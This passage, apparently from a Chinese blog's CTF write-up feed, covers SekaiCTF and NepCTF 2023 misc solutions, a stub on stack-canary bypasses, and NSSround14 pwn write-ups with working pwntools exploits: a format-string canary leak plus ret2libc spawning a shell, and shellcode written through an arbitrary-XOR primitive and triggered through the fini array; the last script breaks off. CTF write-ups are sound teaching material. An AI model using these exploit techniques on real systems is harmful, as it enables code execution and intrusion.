class="string">&#x27;SekaiCTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json = &#123;</span><br><span class="line">    <span class="string">&#x27;crystals&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;numPulls&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;pulls&#x27;</span>: <span class="number">999999</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url, headers=headers, json=json)</span><br><span class="line">res = r.json()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>拿到一段base64，解码得到flag图片</p><p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_flag.png" alt="flag"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2023_WP</title>
      <link href="/NepCTF2023-WP/"/>
      <url>/NepCTF2023-WP/</url>
      
        <content type="html"><![CDATA[<p><strong>比赛详情：misc(7&#x2F;9), pwn(1&#x2F;9)</strong></p><p><del>已经从二进制手变成misc手了，悲</del></p><p><img src="/NepCTF2023-WP/image-20230813192419049.png" alt="排名"></p><span id="more"></span><h1 id="misc-codes"><a href="#misc-codes" class="headerlink" title="misc-codes"></a>misc-codes</h1><p>题目提示flag在环境变量内，所以本题目的是：编写能获取并输出环境变量的C语言代码。</p><p>经过不断试错，发现getenv（），main（int argc, char* args[], char* envp[])等常用的方法均不能通过。</p><p>所以合理推测是把env这个词ban了，把main第三个参数名envp改成e就可以输出了</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* args[], <span class="type">char</span>* e[])</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; e[i] != <span class="literal">NULL</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, e[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/NepCTF2023-WP/image-20230813193450003.png" alt="output" style="zoom:67%;"><h1 id="misc-与AI共舞的哈夫曼"><a href="#misc-与AI共舞的哈夫曼" class="headerlink" title="misc-与AI共舞的哈夫曼"></a>misc-与AI共舞的哈夫曼</h1><p>给了一个经过哈夫曼压缩算法压缩后的文件，直接用copilot生成解压代码了<del>(毕竟不是说与ai共舞嘛)</del></p><p>不过生成的有点问题，输出的解压文件是空的，手动改了一些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read frequency information</span></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    num_of_freq = data[<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_of_freq):</span><br><span class="line">        byte = data[index]</span><br><span class="line">        freq = (data[index+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (data[index+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (data[index+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | data[index+<span class="number">4</span>]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read compressed data</span></span><br><span class="line">    padding = data[index]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    dat = data[index:]</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> dat:</span><br><span class="line">        byte = <span class="built_in">bin</span>(byte)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        compressed_data += byte</span><br><span class="line"></span><br><span class="line">    <span class="comment">#compressed_data = compressed_data[:-padding]</span></span><br><span class="line"></span><br><span class="line">    node_now = root</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            node_now = node_now.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node_now = node_now.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node_now.left <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> node_now.right <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            result += <span class="built_in">bytes</span>([node_now.char])</span><br><span class="line">            node_now = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br></pre></td></tr></table></figure><p><img src="/NepCTF2023-WP/image-20230813194208176.png" alt="huffman_decompressed"></p><p>虽然还是有点问题，不过已经不妨碍得到结果了（）</p><p>NepCTF{huffman_zip_666}</p><h1 id="misc-ConnectedFive"><a href="#misc-ConnectedFive" class="headerlink" title="misc-ConnectedFive"></a>misc-ConnectedFive</h1><p>万宁五子棋，不好评价（</p><p>直接玩过去就好了（）</p><p>（不想再玩一次了，就不放截图了吧，42次也太多了）</p><h1 id="misc-CheckIn"><a href="#misc-CheckIn" class="headerlink" title="misc-CheckIn"></a>misc-CheckIn</h1><p>签到，题目给了flag</p><p><img src="/NepCTF2023-WP/image-20230813204100990.png" alt="checkin"></p><h1 id="misc-陌生的语言"><a href="#misc-陌生的语言" class="headerlink" title="misc-陌生的语言"></a>misc-陌生的语言</h1><p>得到一个图片：</p><img src="/NepCTF2023-WP/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="陌生的纸条" style="zoom: 25%;"><p>提示了题目中A同学是Atsuko Kagari，查了一下是《小魔女学园》的，显然图中的两种语言应该出自该作品。最后查找确定了上下分别是古代龙语和露娜文</p><p>在网上找到了对应的码表</p><p><img src="/NepCTF2023-WP/%E9%BE%99%E8%AF%AD.jpeg" alt="龙语"></p><img src="/NepCTF2023-WP/luna_alphabet.jpg" alt="luna_alphabet" style="zoom: 67%;"><p>分别得到了nepnep a believing，和heart is your magic</p><p>提示flag格式凭语法断句，然后大小写都试一下，得到flag是:</p><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p><h1 id="misc-小叮弹钢琴"><a href="#misc-小叮弹钢琴" class="headerlink" title="misc-小叮弹钢琴"></a>misc-小叮弹钢琴</h1><p>得到一个piano.mid文件，听了一会，发现可能有摩斯密码</p><p>用Audacity打开：</p><img src="/NepCTF2023-WP/image-20230813195608858.png" alt="mose" style="zoom:80%;"><img src="/NepCTF2023-WP/image-20230813195622754.png" alt="xor_data" style="zoom:80%;"><p>发现一半是摩斯，另一半可以侧过来看是一个很大的16进制数，读出来结果如下：</p><p>-.–&#x2F;—&#x2F;..-&#x2F;…&#x2F;….&#x2F;—&#x2F;..-&#x2F;.-..&#x2F;-..&#x2F;..-&#x2F;…&#x2F;.&#x2F;-&#x2F;….&#x2F;..&#x2F;…&#x2F;-&#x2F;—&#x2F;-..-&#x2F;—&#x2F;.-.&#x2F;…&#x2F;—&#x2F;–&#x2F;.&#x2F;-&#x2F;….&#x2F;..&#x2F;-.&#x2F;–.</p><p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p><p>把摩斯密码解密得到YOU SHOULD USE THIS TO XOR SOMETHING</p><p>显然要用这段英文xor刚才的16进制数</p><p>发现这个16进制数有30字节，摩斯密码明文也是30个字符（不算空格）</p><p>所以逐项异或得到答案（这里大小写都试了，小写可以）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&#x27;</span></span><br><span class="line">xor = <span class="string">&#x27;youshouldusethistoxorsomething&#x27;</span></span><br><span class="line">xor_a = [<span class="built_in">int</span>(a[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_a)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor_a[i] ^ <span class="built_in">ord</span>(xor[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到 <code>NepCTF&#123;h4ppy_p14N0&#125;NepCTF&#123;h4pp</code></p><h1 id="misc-你也喜欢三月七么"><a href="#misc-你也喜欢三月七么" class="headerlink" title="misc-你也喜欢三月七么"></a>misc-你也喜欢三月七么</h1><p>得到的txt附件内容如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salt<span class="emphasis">_lenth= 10 </span></span><br><span class="line"><span class="emphasis">key_</span>lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= </span><br><span class="line">b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>显然是一个AES加密，这里肯定要先解出salt和key</p><img src="/NepCTF2023-WP/image-20230813200653505.png" alt="image-20230813200653505" style="zoom:80%;"><p>没什么头绪，所以回去重新看题，发现了一些端倪：</p><ul><li>这群名看起来怪怪的，…，好咸诶 &#x3D;&gt; 推测出群名是盐，也就是salt&#x3D;NepCTF2023</li><li>这需要经过啥256处理一下才能得到解题的关键 &#x3D;&gt; 啥的拼音是sha，所以推测要把salt用sha256加密，得到关键（合理推测就是key了）</li></ul><p>得到sha256（salt）&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p><p>因为附件里说key是16位，所以试了一下截前16字节作为key来解aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;</span></span><br><span class="line">iv_hex = <span class="string">&#x27;88219bdee9c396eca3c637c0ea436058&#x27;</span> <span class="comment">#原始iv转hex的值</span></span><br><span class="line">ciphertext= <span class="string">&#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把hex值转成bytes</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv_hex)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plaintext = aes.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;plaintext:&#x27;</span>, plaintext)</span><br><span class="line"><span class="comment"># plaintext: b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27;</span></span><br></pre></td></tr></table></figure><p>得到的明文拿去解base16，然后再解base64得到</p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p>把图片下载下来：</p><img src="/NepCTF2023-WP/yOkXWSJT.png" alt="yOkXWSJT" style="zoom: 30%;"><p>又是一个奇怪的语言，想到本题背景是星穹铁道，所以去找了一下星铁的文字，发现图片里的应该是宇宙通用文</p><p>去wiki找到了码表:<br><img src="/NepCTF2023-WP/image-20230813202732539.png" alt="宇宙通用文" style="zoom: 67%;"></p><p>对照得到flag：</p><p>NepCTF{HRP_aIways_likes_March_7th}</p><h1 id="pwn-HRP-CHAT-3"><a href="#pwn-HRP-CHAT-3" class="headerlink" title="pwn-HRP-CHAT-3"></a>pwn-HRP-CHAT-3</h1><p>获取途径是进入Start，然后打败boss。</p><p>由于只能攻击一次，所以找一个攻击最高的（H3h3QAQ），保证能秒掉boss。</p><p>Shop里没有，只能抽卡（RollCard）</p><p>出来后直接去打Start就行，输入的下标在源码里找分别对应Characters和skill这两个数组的下标，所以注意自己的H3h3QAQ是哪个下标就行了</p><p><img src="/NepCTF2023-WP/image-20230813203835458.png" alt="image-20230813203835458"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Canary常见绕过思路</title>
      <link href="/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
      <url>/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><em><strong>总览：</strong></em></p><ul><li>基本leak</li><li>fork子进程爆破</li><li>打TLS</li></ul><span id="more"></span><h1 id="1、基本leak"><a href="#1、基本leak" class="headerlink" title="1、基本leak"></a>1、基本leak</h1><p>由于canary是以\x00结尾（正好截断字符），所以如果把\x00覆盖掉，就可以实现leak canary。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSround14wp</title>
      <link href="/NSSround14wp/"/>
      <url>/NSSround14wp/</url>
      
        <content type="html"><![CDATA[<p>本次round14只打了一题，（没报零真是太好了），赛后在@摸鱼の猫 师傅的指点下又解决了一题</p><img src="/NSSround14wp/nssround14.png" alt="round14" style="zoom:50%;"><p><strong>也许是目录</strong></p><ul><li>love</li><li>xor</li></ul><span id="more"></span><h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p><em><strong>PS: 做题都能看到Toka，我直接狂喜-ing</strong></em></p><p>👉 <a href="../resources/pwn_asset/NSS_round14/love.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/loveMain.png" alt="loveMain" style="zoom:75%;"><p>发现main又格式化漏洞，程序开了canary保护</p><p>所以思路就是：<strong>利用printf改写v4使其等于v5，并且泄露canary</strong></p><img src="/NSSround14wp/lovevuln.png" alt="lovevuln" style="zoom:75%;"><p>然后进入vuln函数就是一个简单的溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28037</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4013f3</span></span><br><span class="line">r()</span><br><span class="line">payload = <span class="string">b&#x27;%520c%9$n.%15$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">res = r().split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(res[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40125d</span>)<span class="comment"># 这里记得返回到vuln，别返回到main啦，要不然又要再利用一遍printf了</span></span><br><span class="line">sl(payload)</span><br><span class="line">libc_base = get_addr() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret)</span><br><span class="line">payload += p64(rdi) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">i()</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>👉 <a href="../resources/pwn_asset/NSS_round14/xor.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/xorMain.png" alt="xorMain" style="zoom:80%;"><p>flag在bss段，判断小于等于0跳出循环，xorByteWithAddress可以与任意地址数据异或，所以给高位异或一个0xFF（变成负数），基本上相当于无限循环（loop）了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后找一段rw（readable，writeable）区域写入shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0, 随便找到的，只是把个位凑个0而已</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>然后想办法触发shellcode，因为程序没有栈溢出，所以这里我们让程序自己触发。</p><p>由于在main结束后会跳转到_final_array储存的地址，这里把储存的地址改成我们写入的shellcode地址，然后再把flag高位异或一个0xff（变成0，也就是说flag变成正数，跳出循环，使main结束）</p><img src="/NSSround14wp/finalArray.png" alt="finalArray" style="zoom:80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 to 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>完整exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 